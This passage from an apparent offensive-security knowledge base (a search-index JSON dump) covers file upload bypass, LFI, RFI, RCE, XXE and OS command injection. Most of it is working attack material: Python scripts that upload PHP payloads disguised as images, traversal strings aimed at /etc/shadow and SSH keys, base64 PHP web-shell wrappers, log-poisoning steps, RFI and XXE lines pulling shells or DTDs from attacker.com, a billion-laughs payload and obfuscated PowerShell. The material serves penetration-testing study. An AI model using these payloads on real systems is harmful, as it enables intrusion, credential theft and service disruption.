disguised as an image by setting the <code>Content-Type</code> to <code>image/jpeg</code>. Content-disposition manipulation Attacker can manipulate the <code>Content-Disposition</code> header to suggest a misleading filename (e.g., <code>Content-Disposition: attachment; filename=\"shell.php.jpg\"</code>). Obfuscated Extensions Attacker can use obfuscated extensions (e.g., <code>.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar, .inc</code>) to bypass security checks."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#automating-content-type-duplication-python","title":"Automating Content-Type Duplication (Python)","text":"<pre><code>import requests\nfrom requests import Request, Session\n\nurl = 'http://[DOMAIN-NAME]/upload'\nfile_path = 'path/to/malicious.php'\nfile_name = 'malicious.php'\n\n# Prepare the malicious file payload\nfiles = {'file': (file_name, open(file_path, 'rb'), 'image/jpeg')}\n\n# Create a request and prepare to send\nreq = Request('POST', url, files=files)\nprepared = req.prepare()\n\n# Duplicate Content-Type headers\nprepared.headers['Content-Type'] = 'image/jpeg'\nprepared.headers.add_header('Content-Type', 'application/x-php')\n\n# Use Session to send the prepared request\nwith Session() as s:\n    response = s.send(prepared)\n\nprint(response.status_code, response.text)\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/File-Upload/#magic-byte-injection-script-python","title":"Magic Byte Injection Script (Python)","text":"<pre><code>import requests\n\ndef add_magic_bytes(file_path, output_path):\n    \"\"\"Prepends GIF magic bytes to a file.\"\"\"\n    with open(file_path, 'rb') as f:\n        content = f.read()\n    with open(output_path, 'wb') as f:\n        f.write(b'GIF89a' + content)\n\ndef upload_file(url, file_path):\n    \"\"\"Uploads a file to a server.\"\"\"\n    files = {'file': ('fakeimage.gif', open(file_path, 'rb'), 'image/gif')}\n    response = requests.post(url, files=files)\n    return response\n\n# Paths and URL\noriginal_php_path = 'path/to/original_payload.php'\nmodified_php_path = 'path/to/modified_payload.gif'\nupload_url = 'http://[DOMAIN-NAME]/upload'\n\n# Add magic bytes and upload\nadd_magic_bytes(original_php_path, modified_php_path)\nresponse = upload_file(upload_url, modified_php_path)\n\nprint(response.status_code, response.text)\n</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/LFI/","title":"Local File Inclusion (LFI)","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/LFI/#introduction","title":"Introduction","text":"<p>Local File Inclusion (LFI) is a type of vulnerability in web applications that allows an attacker to read and potentially execute files on the server that hosts the web application. This occurs when an application includes files without properly sanitizing user input, allowing paths to unintended files to be injected. LFI can lead to information disclosure and remote code execution.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/LFI/#common-lfi-paths-on-linux-systems","title":"Common LFI Paths on Linux Systems","text":"<ol> <li>Accesses the system user account and password file. <code>/etc/passwd</code></li> <li>Reads the root user email files. <code>/var/mail/root</code></li> <li>Retrieves SSH private keys from a user home directory. <code>/home/user/.ssh/id_rsa</code></li> <li>Reads the Apache web server access log. <code>/var/log/apache2/access.log</code></li> <li>Accesses WordPress configuration files typically located in web server directories   <code>/var/www/html/wp-config.php</code></li> <li>Reads the shadow file containing encrypted passwords and related information for user accounts. <code>/etc/shadow</code></li> <li><code>curl --path-as-is http://[DOMAIN_NAME]/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/LFI/#common-lfi-paths-on-windows-systems","title":"Common LFI Paths on Windows Systems","text":"<ol> <li>Retrieves the Windows initialization file, which contains settings.     <code>\\windows\\win.ini</code></li> <li>Retrieves SSH private keys in the user directory. <code>C:/Users/viewer/.ssh/id_rsa</code></li> <li> <p>IIS WEb config file                  <code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config</code> <code>C:\\inetpub\\wwwroot\\web.config</code></p> </li> <li> <p>Accesses the system hosts file, which contains network information. <code>C:/Windows/System32/drivers/etc/hosts</code></p> </li> <li>Reads IIS web server log files, which can be exploited for further attacks. <code>C:/inetpub/logs/LogFiles/W3SVC1/u_ex&lt;date&gt;.log</code></li> <li>Accesses the boot configuration data with startup settings. <code>C:/boot.ini</code></li> <li>Reads the autoexec batch file used in older versions of Windows for global environment settings. <code>C:/autoexec.bat</code></li> <li>Accesses the hosts file to view or manipulate network settings. <code>C:/windows/system32/drivers/etc/hosts</code></li> <li>Retrieves the Security Accounts Manager file storing user credentials. <code>C:/windows/repair/SAM</code></li> <li>Accesses the WordPress configuration file on XAMPP installations. <code>../../../../../../../../xampp/htdocs/blog/wp-config.php</code></li> <li>Retrieves SSH private keys from a user profile. <code>../../../../../../../../Users/Viewer/.ssh/id_rsa</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/LFI/#lfi-filter-bypassing-techniques","title":"LFI Filter Bypassing Techniques","text":"<p>Techniques for bypassing LFI filters using path traversal, filter bypasses, and encoding:</p> <ol> <li>Basic LFI: Displays the system password file. <code>/index.php?language=/etc/passwd</code></li> <li>Path Traversal LFI: Uses directory traversal to access critical system files. <code>/index.php?language=../../../../etc/passwd</code></li> <li>Name Prefix LFI: Similar to basic path traversal with different path depth. <code>/index.php?language=/../../../etc/passwd</code></li> <li>Approved Path LFI: Bypasses restrictions by starting with an allowed path. <code>/index.php?language=./languages/../../../../etc/passwd</code></li> <li>Basic Path Traversal Bypass: Uses obscure sequences to bypass simple traversal filters. <code>/index.php?language=....//....//....//....//etc/passwd</code></li> <li>URL Encoding Filter Bypass: Encodes traversal sequences to evade detection. <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></li> <li>Path Truncation: Uses deep recursion to force path truncation. <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[REPEATED ~2048 times]</code></li> <li>Null Byte Obsolescence: Appends a null byte to terminate the string prematurely (not effective on modern systems). <code>/index.php?language=../../../../etc/passwd%00</code></li> <li>Base64 PHP Reading: Encodes PHP files into base64 for safer retrieval. <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/RCE/","title":"Remote Code Execution (RCE)","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/RCE/#introduction","title":"Introduction","text":"<p>Remote Code Execution (RCE) is a vulnerability that enables an attacker to execute arbitrary commands on a remote system. This exploit allows the attacker to manipulate or access data, disrupt system operations, or gain elevated privileges.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/RCE/#remote-code-execution-rce-techniques","title":"Remote Code Execution (RCE) Techniques","text":"<ol> <li> <p>Data Wrapper: Executes commands encoded directly in the URL. <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&amp;cmd=id</code></p> </li> <li> <p>Input Wrapper: Runs commands from data sent in a web request. <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://[DOMAIN_NAME]/index.php?language=php://input&amp;cmd=whoami\"</code></p> </li> <li> <p>Expect Wrapper: Executes commands using the Expect PHP wrapper. <code>curl -s \"http://[DOMAIN_NAME]/index.php?language=expect://id\"</code></p> </li> <li> <p>Remote PHP Shell: Uses a remote PHP script to execute commands. <code>/index.php?language=http://[IP-ADDRESS]:[LISTENING-PORT]/shell.php&amp;cmd=id</code></p> </li> <li> <p>Malicious Image Upload: Executes code hidden within an image file. <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p> </li> <li> <p>Malicious ZIP Upload: Runs PHP code hidden inside a ZIP file. <code>/index.php?language=zip://shell.zip#shell.php&amp;cmd=id</code></p> </li> <li> <p>Malicious PHAR Upload: Executes code from a PHP archive disguised as an image file. <code>/index.php?language=phar://./profile_images/shell.jpg/shell.txt&amp;cmd=id</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/RCE/#target-logs-for-rce-poisoning","title":"Target Logs for RCE Poisoning","text":"<p>Logs vulnerable to RCE poisoning often include user inputs or error information:</p> <ol> <li>Access Logs: <code>/var/log/apache2/access.log</code>, <code>/var/log/httpd-access.log</code></li> <li>Error Logs: <code>/var/log/apache2/error.log</code>, <code>/var/log/apache/error.log</code></li> <li>Logs to Tracks authentication attempts. <code>/var/log/auth.log</code></li> <li>Logs security details, used in systems with SELinux. <code>/var/log/secure</code></li> <li>Logs For web applications. <code>/var/www/logs/access_log</code></li> <li>Logs for Webmin tool. <code>/var/webmin/miniserv.log</code></li> <li>Logs from Lighttpd web server. <code>/var/log/lighttpd/access.log</code></li> <li>Logs from ProFTPD server. <code>/var/log/lighttpd/access.log</code> -</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/RCE/#step-by-step-rce-via-log-poisoning","title":"Step-by-Step: RCE via Log Poisoning","text":"<ol> <li> <p>Inject the Payload: This involves modifying the User-Agent string, other header fields, or the content of a request that you know will be logged. <code>&lt;?php system($_GET['cmd']); ?&gt;</code>.</p> </li> <li> <p>Exploit LFI Vulnerability: Use an existing Local File Inclusion (LFI) vulnerability to include the poisoned log file in a web page's execution path. <code>http://[DOMAIN_NAME]/index.php?file=../../../../var/log/apache2/access.log</code></p> </li> <li> <p>Execute the Payload: Add a command to the URL as a parameter if the payload is designed to be executed via a GET request. <code>http://[RFI-URL]/vulnerable_page.php?file=../../../../var/log/apache2/access.log&amp;cmd=whoami</code></p> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/XXE/","title":"XML External Entity (XXE)","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/XXE/#introduction","title":"Introduction","text":"<p>XML External Entity (XXE) is a vulnerability where attacker manipulate XML processing to access server files, provoke server-side behaviors, or interact with backend systems, often leading to unauthorized data exposure or system impacts.</p> <pre><code>sequenceDiagram\n    participant A as Attacker\n    participant B as Web Server\n    participant C as XML Parser\n    participant U as User\n\n    A-&gt;&gt;B: 1. Sends XML Request with Malicious Payload\n    B-&gt;&gt;C: 2. Passes XML to Parser\n    C--&gt;&gt;B: 3. Resolves External Entity (retrieves data)\n    B--&gt;&gt;A: 4. Sends Response with Retrieved Data</code></pre>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/XXE/#the-impact-of-xxe-attacks","title":"The Impact of XXE Attacks","text":"Impact Description Local File Inclusion Attacker can access and retrieve the contents of local files by using the \"file://\" scheme. Server-Side Request Forgery (SSRF) The attacker could force the vulnerable server to send HTTP requests to other servers and then capture the responses using \"http://\" or \"https://\". Blind SSRF Even when direct responses aren\u2019t returned, attacker could forward the response data to an external server under their control by nesting entities. Information Disclosure Malformed XML payloads could cause the application to unintentionally leak sensitive information. Denial-of-Service (DoS) Some XML parsers are prone to vulnerabilities that can crash the system when handling specially crafted XML files."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/XXE/#overview-of-xxe-exploitation-techniques","title":"Overview of XXE Exploitation Techniques","text":"<p>This table outlines different XXE exploitation techniques, showcasing example payloads and their effects. These methods leverage XML parser vulnerabilities to extract data, disrupt services, or access internal systems.</p> Payload Type Example Payload Description Remote Resource Retrieval <code>&lt;!ENTITY xxe SYSTEM \"http://example.com/malicious.dtd\"&gt;</code> This method retrieves external resources by defining an entity that loads data from a remote URL. Local File Disclosure (LFI) <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> This technique accesses local files on the server by specifying a local file path Base64 Encoding for Data Exfiltration <code>&lt;!ENTITY data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;</code> Encodes the contents of local files in Base64 format to bypass simple data leakage protections and exfiltrate data covertly. Error-Induced Information Leakage <code>&lt;!ENTITY % err SYSTEM \"file:///nonexistent/%file;\"&gt; &lt;!ENTITY call '%err;'&gt;</code> Intentionally triggers errors that can leak server information or expose other vulnerabilities. Out-of-Band (OOB) Interaction <code>&lt;!ENTITY % dtd SYSTEM \"http://attacker.com/external.dtd\"&gt; %dtd;</code> Uses external entities to initiate interactions with an attacker-controlled server, allowing data to be transmitted out-of-band. Blind XXE for Service Probing <code>&lt;!ENTITY % xxe SYSTEM \"http://internal-service.example.com/\"&gt; %xxe;</code> Exploits blind XXE to probe internal systems and services by trying to interact with them. Recursive Entity Expansion (Billion Laughs Attack) <code>&lt;!ENTITY lol \"lol\"&gt;&lt;!ENTITY lol2 \"&amp;lol;&amp;lol;\"&gt; ... &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;\"&gt;</code> Causes a denial of service by creating an exponential growth in processing requirements through nested entities. Parameter Entity Attack for SSRF <code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"http://private.example.com/\"&gt; %xxe;]&gt;</code> Uses parameter entities to construct requests for server-side request forgery (SSRF), targeting internal or external systems. Complex Nested Entities <code>&lt;!DOCTYPE root [&lt;!ENTITY % pe SYSTEM \"http://example.com/ent.dtd\"&gt; %pe;]&gt;</code> Involves defining entities within entities, potentially leading to complex exploitations and unexpected behaviors from the XML parser."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/Checklist/File-Upload/","title":"File Upload","text":"<ol> <li> <p>General File Upload Testing</p> <ul> <li> Upload files containing payloads and observe application response.</li> <li> Attempt to change file paths to overwrite existing system files.</li> <li> Test the application's handling of excessively large files to prevent Denial of Service attacks.</li> <li> Check for leakage of metadata from uploaded files.</li> <li> Assess vulnerabilities related to the ImageMagick library (e.g., Image Tragick - CVE-2016-3714).</li> <li> Conduct pixel flood attacks with images of high density.</li> <li> Verify file storage location for directory traversal vulnerabilities.</li> <li> Ensure that proper validation of file types is enforced both client-side and server-side.</li> <li> Test for server-side code execution vulnerabilities by uploading files with executable content.</li> <li> Check if uploaded files are securely sandboxed to prevent unauthorized access.</li> </ul> </li> <li> <p>Bypass Techniques</p> <ul> <li> Test null byte (<code>%00</code>) bypass for file type checks.</li> <li> Assess the enforcement of MIME types (Content-Type bypass).</li> <li> Test file content checking based on header bytes (Magic Byte bypass).</li> <li> Confirm server-side enforcement of file restrictions to bypass client-side validation.</li> <li> Verify the robustness of file extension checks against blacklisted extensions.</li> <li> Test for Unicode vulnerabilities in file names (homographic character bypass).</li> <li> Attempt to bypass restrictions by using double file extensions (e.g., <code>file.jpg.php</code>).</li> <li> Test file upload functionality in various contexts within the application.</li> <li> Utilize automated tools and scripts for comprehensive file upload security testing.</li> <li> Review the application's code for insecure handling practices related to file uploads.</li> </ul> </li> <li> <p>Specific Attacks</p> <ul> <li> Test for XXE (XML External Entity) injection via file upload.</li> <li> Attempt to upload files with malicious content triggering SSRF (Server-Side Request Forgery).</li> <li> Verify file handling in different environments (e.g., Windows vs. Linux).</li> <li> Check for stored XSS vulnerabilities by uploading files with script content in metadata.</li> <li> Test for insecure file upload configurations in third-party libraries or plugins.</li> </ul> </li> <li> <p>Post-Upload Testing</p> <ul> <li> Verify if uploaded files are scanned for malware.</li> <li> Ensure uploaded files are stored in non-executable directories.</li> <li> Implement proper access controls on uploaded files to prevent unauthorized access.</li> <li> Test for race conditions in file upload functionality.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/Checklist/LFI/","title":"Local File Inclusion (LFI)","text":"<ol> <li> <p>Initial Information Gathering</p> <ul> <li> Identify and map all endpoints that accept file path inputs.</li> <li> Review source code (if available) to understand file handling mechanisms.</li> <li> Check for endpoints where file paths are passed as parameters in URLs, headers, or body.</li> </ul> </li> <li> <p>Basic LFI Testing</p> <ul> <li> <code>../../../../etc/passwd</code></li> <li> <code>..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li> <li> <code>../../../../../../../../../../../etc/passwd</code></li> <li> Try to include different system files (e.g., <code>/etc/hosts</code>, <code>/proc/version</code>, <code>C:\\Windows\\win.ini</code>).</li> </ul> </li> <li> <p>Path Traversal</p> <ul> <li> URL encoding: <code>%2e%2e%2f</code>, <code>%2e%2e%2f</code></li> <li> Double URL encoding: <code>%252e%252e%252f</code></li> <li> Unicode encoding: <code>..%c0%af..%c0%af..%c0%af</code></li> <li> Test bypass techniques for traversal filters (e.g., using null bytes <code>.%00</code>, appending slashes).</li> </ul> </li> <li> <p>Advanced Path Traversal Techniques</p> <ul> <li> Test for double encoding vulnerabilities.</li> <li> Try bypassing filters with non-standard encodings and mixed encodings.</li> <li>Use directory traversal sequences with variations like:<ul> <li> <code>....//</code></li> <li> <code>....\\/</code></li> <li> <code>%2e%2e%2f%2e%2e%2f</code></li> </ul> </li> </ul> </li> <li> <p>File Inclusion and Execution</p> <ul> <li> <code>/etc/passwd</code> (Linux)</li> <li> <code>/proc/self/environ</code></li> <li> <code>/proc/self/fd/0</code></li> <li> <code>C:\\Windows\\win.ini</code> (Windows)</li> <li> Test for inclusion of log files, configuration files, or other readable files.</li> </ul> </li> <li> <p>Null Byte Injection</p> <ul> <li> <code>/etc/passwd%00</code></li> <li> <code>C:\\Windows\\win.ini%00</code></li> </ul> </li> <li> <p>File Upload and Inclusion</p> <ul> <li> Check if file upload functionalities are present and try uploading files for inclusion.</li> <li> Test inclusion of uploaded files to execute code (e.g., web shells).</li> </ul> </li> <li> <p>Log Poisoning and Inclusion</p> <ul> <li> Inject payload into User-Agent, Referer, or other headers.</li> <li> Include poisoned log files to execute injected payloads.</li> </ul> </li> <li> <p>Remote File Inclusion (RFI)</p> <ul> <li> Check if the application allows remote file inclusion.</li> <li>Test including remote files via HTTP or FTP URLs:<ul> <li> <code>http://example.com/shell.txt</code></li> <li> <code>ftp://example.com/shell.txt</code></li> </ul> </li> </ul> </li> <li> <p>Error Handling and Response Analysis</p> <ul> <li> Analyze server responses for clues about the presence of LFI vulnerabilities.</li> <li> Look for error messages that disclose file paths or other sensitive information.</li> <li> Verify if application stack traces are exposed in responses.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/Checklist/RFI/","title":"Remote File Inclusion (RFI)","text":"<ol> <li> <p>Initial Information Gathering</p> <ul> <li> Identify and map all endpoints that accept file path or URL inputs.</li> <li> Review source code (if available) to understand file handling mechanisms.</li> <li> Check for endpoints where URLs or file paths are passed as parameters in URLs, headers, or body.</li> </ul> </li> <li> <p>Basic RFI Testing</p> <ul> <li> <code>http://Attacker.com/shell.txt</code></li> <li> <code>http://Attacker.com/shell.php</code></li> <li> <code>ftp://Attacker.com/shell.txt</code></li> <li> <code>ftp://Attacker.com/shell.php</code></li> <li> Try including remote files hosted on different servers.</li> </ul> </li> <li> <p>URL Manipulation</p> <ul> <li> Use different URL schemes (<code>HTTP</code>, <code>HTTPS</code>, <code>FTP</code>).</li> <li> Use different file extensions (e.g., <code>.txt</code>, <code>.php</code>, <code>.jpg</code>).</li> <li>Test bypass techniques for URL filters and restrictions:<ul> <li> Using URL encoding: <code>http%3A%2F%2Fattacker.com%2Fshell.txt</code></li> <li> Using double URL encoding: <code>http%253A%252F%252Fattacker.com%252Fshell.txt</code></li> <li> Using mixed case URL encoding: <code>hTtP://aTtAcKeR.com/sHeLl.TxT</code></li> </ul> </li> </ul> </li> <li> <p>Advanced URL Manipulation Techniques</p> <ul> <li> Test for double encoding vulnerabilities.</li> <li> Try bypassing filters with non-standard encodings and mixed encodings.</li> <li>Use variations of URLs to bypass filters:<ul> <li> <code>http://attacker.com/shell.txt%00.jpg</code></li> <li> <code>http://attacker.com/shell.txt?.jpg</code></li> <li> <code>http://attacker.com/shell.txt#.jpg</code></li> </ul> </li> </ul> </li> <li> <p>File Upload and Inclusion</p> <ul> <li> Check if file upload functionalities are present and try uploading files for inclusion.</li> <li> Test inclusion of uploaded files to execute code (e.g., web shells).</li> </ul> </li> <li> <p>Log Poisoning and Inclusion</p> <ul> <li> Inject payload into User-Agent, Referer, or other headers.</li> <li> Include poisoned log files to execute injected payloads.</li> </ul> </li> <li> <p>Error Handling and Response Analysis</p> <ul> <li> Analyze server responses for clues about the presence of RFI vulnerabilities.</li> <li> Look for error messages that disclose file paths or other sensitive information.</li> <li> Verify if application stack traces are exposed in responses.</li> </ul> </li> <li> <p>Local File Inclusion (LFI) Fallback Testing</p> <ul> <li> If RFI is not possible, test for Local File Inclusion (LFI) vulnerabilities.</li> <li>Test common LFI payloads to include local files:<ul> <li> <code>../../../../etc/passwd</code></li> <li> <code>..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li> <li> <code>../../../../../../../../../../../etc/passwd</code></li> </ul> </li> </ul> </li> <li> <p>Server-Side Request Forgery (SSRF)</p> <ul> <li> Test for SSRF vulnerabilities that can be exploited to achieve RFI.</li> <li>Attempt to include internal resources via SSRF:<ul> <li> <code>http://localhost:8080/</code></li> <li> <code>http://127.0.0.1/</code></li> <li> <code>http://internal-service/</code></li> </ul> </li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/File-%26-File-Inclusions/Checklist/XXE/","title":"XML External Entity (XXE)","text":"<ol> <li> <p>Initial Information Gathering</p> <ul> <li> Identify and map all endpoints that accept XML input.</li> <li> Review source code (if available) to understand XML parsing mechanisms.</li> <li> Check for user inputs in XML request bodies, SOAP messages, and API endpoints.</li> </ul> </li> <li> <p>Basic XXE Testing</p> <ul> <li> Test with a basic XXE payload to identify vulnerabilities: <pre><code>&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre></li> <li> Inject the payload in different parts of the XML (e.g., elements, attributes).</li> </ul> </li> <li> <p>XXE Payloads</p> <ul> <li> Test for blind XXE using out-of-band (OOB) techniques: <pre><code>&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"http://attacker.com/xxe\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre></li> <li> Test for SSRF (Server-Side Request Forgery): <pre><code>&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"http://localhost:8080/admin\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre></li> <li>Test for file inclusion vulnerabilities with common files:<ul> <li> <code>/etc/passwd</code></li> <li> <code>/etc/hosts</code></li> <li> <code>C:\\Windows\\win.ini</code></li> </ul> </li> </ul> </li> <li> <p>Parameter Entities and XML Injection</p> <ul> <li> Test with parameter entities: <pre><code>&lt;!DOCTYPE foo [\n  &lt;!ENTITY % xxe SYSTEM \"file:///etc/passwd\" &gt;\n  &lt;!ENTITY xxe \"&lt;!ENTITY evil SYSTEM 'file:///etc/passwd' &gt;\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre></li> <li> Test XML injection to manipulate the structure and content: <pre><code>&lt;root&gt;\n  &lt;data&gt;\n    &lt;xxe&gt;&amp;xxe;&lt;/xxe&gt;\n  &lt;/data&gt;\n&lt;/root&gt;\n</code></pre></li> </ul> </li> <li> <p>Recursive Entities</p> <ul> <li> Test for recursive entity expansion (Billion Laughs Attack): <pre><code>&lt;!DOCTYPE lolz [\n  &lt;!ENTITY lol \"lol\"&gt;\n  &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\n  &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\n  &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\n  &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\n  &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\n  &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\n  &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\n  &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\n  &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\n]&gt;\n&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;\n</code></pre></li> </ul> </li> <li> <p>Out-of-Band (OOB) Detection</p> <ul> <li> Set up an OOB endpoint to detect blind XXE: <pre><code>&lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"http://yourserver.com/xxe\" &gt;]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre></li> <li> Use tools like Burp Collaborator to capture OOB interactions.</li> </ul> </li> <li> <p>Error Handling and Response Analysis</p> <ul> <li> Analyze server responses for clues about XXE vulnerabilities.</li> <li> Look for error messages that disclose file paths or other sensitive information.</li> <li> Verify if application stack traces are exposed in responses.</li> </ul> </li> <li> <p>SOAP Services</p> <ul> <li> Test SOAP-based services for XXE vulnerabilities: <pre><code>&lt;soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n  &lt;soap:Body&gt;\n    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre></li> </ul> </li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/","title":"OS Command Injection","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#command-injection","title":"Command Injection","text":"<p>Command injection permits the execution of arbitrary operating system commands by an attacker on the server hosting an application. This can lead to unauthorized access or control over the application's environment and underlying system, potentially compromising the application and all its data.</p>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#identify-injection-points","title":"Identify Injection Points","text":"<ol> <li>Parameter Injection: Check if any input parameters are directly used in command execution.</li> <li>Path Injection: Look for file paths that can be manipulated to include command execution.</li> <li>Header Injection: Inspect HTTP headers (e.g., User-Agent, Referer) for possible injection points.</li> <li>Cookie Injection: Analyze cookie values for potential command injection vectors.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#determine-context","title":"Determine Context","text":"<ol> <li>Quoted Context: Commands need to break out of quotes (using <code>\"</code> or <code>'</code>) before execution.</li> <li>Unquoted Context: Commands are directly appended to the command string.</li> </ol>"},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#basic-command-execution","title":"Basic Command Execution","text":"Technique Description <code>ls \\| id</code> Executes both commands. <code>ls \\| id</code> Pipes the output of <code>ls</code> into <code>id</code>. <code>ls &amp;&amp; id</code> Executes <code>id</code> if <code>ls</code> finishes successfully. <code>ls &amp; id</code> Executes both but shows the output of only the second command. <code>ls %0A id</code> Executes both using URL encoded newline (<code>%0A</code>). <code>ls</code> Executes command within backticks. <code>$(ls)</code> Executes command within <code>$()</code>. <code>ls; id</code> Chains commands using semicolon. <code>ls${IFS}id</code> Uses environment variables to inject commands."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#bypass-protections","title":"Bypass Protections","text":""},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#unix-specific-techniques","title":"Unix-Specific Techniques","text":"Technique Description <code>&gt; /var/www/html/out.txt</code> Redirects output to a file. <code>&lt; /etc/passwd</code> Sends input from a file."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#windows-specific-techniques","title":"Windows-Specific Techniques","text":"Technique Description <code>powershell.exe -Command \"...\"</code> Executes PowerShell commands. <code>cmd.exe /c \"...\"</code> Executes commands using <code>cmd.exe</code>."},{"location":"Offensive-Security/Web-Application/Web-Exploit/Injections/Server-Side-Injections/Command-Injection/#limitation-bypasses","title":"Limitation Bypasses","text":"Technique Description <code>powershell C:**2\\n??e*d.*?</code> Bypasses filters using wildcard characters in PowerShell. <code>@^p^o^w^e^r^shell c:**32\\c*?c.e?e</code> Executes calc using obfuscated PowerShell command. 